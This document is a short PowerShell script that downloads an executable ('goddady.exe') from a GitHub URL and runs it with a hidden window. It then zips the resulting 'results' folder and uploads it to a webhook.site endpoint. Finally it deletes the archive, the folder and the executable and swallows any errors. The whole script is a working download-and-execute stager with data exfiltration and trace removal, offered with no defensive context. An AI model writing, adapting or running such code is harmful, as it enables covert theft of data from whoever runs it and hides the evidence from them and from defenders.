$exeName = 'goddady.exe'; # Name of the executable
$zipUrl = 'https://webhook.site/2911c139-ed87-4411-a940-58458f44ebb1'; # Replace with the URL to receive the zip file
$exePath = Join-Path $PSScriptRoot $exeName;
$resultsFolder = Join-Path $PSScriptRoot 'results';
$zipPath = Join-Path $PSScriptRoot 'results.zip';

try {
    if (-not (Test-Path $exePath -PathType Leaf)) {
        iwr -Uri 'https://github.com/AndreiVladescu/Powershell-Scripts/raw/refs/heads/main/goddady.exe' -OutFile $exePath; # Download only if not present
    }

    Start-Process -FilePath $exePath -WindowStyle Hidden; # Run in background

    Start-Sleep -Seconds 10; # Give the process time to generate results

    if (Test-Path $resultsFolder -PathType Container) {
        Add-Type -AssemblyName 'System.IO.Compression.FileSystem';
        [System.IO.Compression.ZipFile]::CreateFromDirectory($resultsFolder, $zipPath);

        $webClient = New-Object System.Net.WebClient;
        $webClient.UploadFile($zipUrl, $zipPath);

        Remove-Item $zipPath;
        Remove-Item -Recurse -Force $resultsFolder;
		Remove-Item $exeName;
    }

} catch {
    #Write-Error $_;
}